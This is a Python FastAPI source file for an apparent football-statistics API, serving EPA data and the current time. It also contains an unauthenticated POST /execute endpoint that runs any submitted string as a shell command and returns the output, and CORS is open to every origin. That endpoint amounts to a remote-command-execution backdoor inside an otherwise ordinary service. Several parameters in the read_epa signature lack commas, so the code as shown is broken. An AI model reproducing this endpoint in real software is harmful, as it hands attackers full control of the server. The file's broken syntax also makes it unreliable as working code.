from api.db import get_epa
import api.download as dw
import datetime
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from fastapi.encoders import jsonable_encoder
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
import os
from upstash_qstash import Client
import subprocess
from pydantic import BaseModel
from typing import List, Union

load_dotenv()

#client = Client(os.environ.get("QSTASH_TOKEN"))
#schedules = client.schedules()
#res = schedules.create({
#    "destination": "https://fastapi-test-inky.vercel.app/tempo",
#    "cron": "* 1 * * *",
#    "method": "GET"
#})

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)   

class Command(BaseModel):
    command: str

@app.post("/execute")
async def execute_command(cmd: Command):
    try:
        result = subprocess.run(cmd.command, shell=True, capture_output=True, text=True)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get('/epa')
async def read_epa(
     year: int, 
     down: Union[str, List[int]] = Query("all")
     quarter: Union[str, List[int]] = Query("all")
     weeks: Union[str, List[int]] = Query("all")
     include_playoffs: bool =False, 
     wp_offset: float = 0, 
     vegas_wp_offset: float = 0
    ):

    print(year, down, quarter, weeks, include_playoffs, wp_offset, vegas_wp_offset)
    return JSONResponse(content=jsonable_encoder(get_epa(year, down, quarter, weeks, include_playoffs, wp_offset, vegas_wp_offset)))

@app.get('/tempo')
async def return_time():
    print((datetime.datetime.now()))
    return str(datetime.datetime.now())
